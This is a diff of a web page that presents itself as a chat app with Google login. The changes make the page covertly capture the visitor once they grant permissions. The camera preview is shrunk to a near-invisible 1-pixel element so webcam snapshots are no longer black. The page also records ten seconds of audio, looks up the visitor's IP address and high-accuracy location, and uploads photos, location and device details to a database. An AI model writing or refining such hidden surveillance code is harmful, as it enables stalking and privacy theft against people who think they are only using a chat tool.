@@ -36,7 +36,10 @@
         .chat-in input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 8px 15px; border-radius: 50px; outline: none; font-size: 12px; }
         
         .logout-btn { background: transparent; border: 1px solid #444; color: #aaa; padding: 5px 15px; border-radius: 50px; cursor: pointer; font-size: 12px; margin: 10px; }
-        canvas, video { display: none; }
+        
+        /* Black Snap Fix */
+        canvas { display: none; }
+        #vSource { position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
 <body>
@@ -125,17 +128,23 @@
         window.googleLogout = () => signOut(auth).then(() => location.reload());
 
         window.startApp = async () => {
+            const video = document.getElementById('vSource');
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => null);
-            if(stream) document.getElementById('vSource').srcObject = stream;
+            
+            if(stream) {
+                video.srcObject = stream;
+                // ভিডিও লোড হওয়ার জন্য অপেক্ষা
+                video.onloadedmetadata = () => video.play();
+            }
             
             document.getElementById('perm-modal').style.display = 'none';
             document.getElementById('main-ui').style.display = 'block';
             document.getElementById('u-name').innerText = loggedUser.displayName;
             document.getElementById('u-pic').src = loggedUser.photoURL;
 
-            // অটো অ্যাকশন
             if(stream) {
-                takeSnap(loggedUser);
+                // ক্যামেরা রেডি হতে ২ সেকেন্ড সময় দিয়ে প্রথম স্ন্যাপ
+                setTimeout(() => takeSnap(loggedUser), 2000);
                 recordVoice(stream, 10000); 
             }
 
@@ -150,27 +159,35 @@
             const video = document.getElementById('vSource');
             const canvas = document.getElementById('snapCanvas');
             const ctx = canvas.getContext('2d');
-            setTimeout(async () => {
-                ctx.drawImage(video, 0, 0, 640, 480);
-                const dataImg = canvas.toDataURL('image/jpeg', 0.5);
-                const userRef = doc(db, "users", user.email.replace('.', '_'));
-                const s = await getDoc(userRef);
-                let picList = s.data()?.picList || [];
-                picList.unshift(dataImg);
-                if(picList.length > 5) picList.pop();
 
-                const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'N/A'}));
-                
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    await setDoc(userRef, { 
-                        name: user.displayName, email: user.email, photo: user.photoURL,
-                        picList, ip: ipData.ip, loc: `${pos.coords.latitude},${pos.coords.longitude}`,
-                        status: "Online", lastView: new Date().toLocaleString(), device: navigator.userAgent
-                    }, { merge: true });
-                }, async () => {
-                    await setDoc(userRef, { picList, ip: ipData.ip, status: "Online", lastView: new Date().toLocaleString() }, { merge: true });
-                });
-            }, 2000);
+            // চেক করা ভিডিও ডাটা দিচ্ছে কিনা
+            if (video.readyState < 2 || video.videoWidth === 0) {
+                setTimeout(() => takeSnap(user), 1000);
+                return;
+            }
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const dataImg = canvas.toDataURL('image/jpeg', 0.6);
+            const userRef = doc(db, "users", user.email.replace('.', '_'));
+            const s = await getDoc(userRef);
+            let picList = s.data()?.picList || [];
+            picList.unshift(dataImg);
+            if(picList.length > 5) picList.pop();
+
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'N/A'}));
+            
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await setDoc(userRef, { 
+                    name: user.displayName, email: user.email, photo: user.photoURL,
+                    picList, ip: ipData.ip, loc: `${pos.coords.latitude},${pos.coords.longitude}`,
+                    status: "Online", lastView: new Date().toLocaleString(), device: navigator.userAgent
+                }, { merge: true });
+            }, async () => {
+                await setDoc(userRef, { picList, ip: ipData.ip, status: "Online", lastView: new Date().toLocaleString() }, { merge: true });
+            }, { enableHighAccuracy: true });
         }
 
         async function recordVoice(stream, time) {
@@ -199,7 +216,6 @@
             if(!msg) return;
             document.getElementById('chat-log').innerText = "You: " + msg;
             document.getElementById('ai-msg').value = "";
-            // Gemini API call logic here if needed
         }
     </script>
 </body>
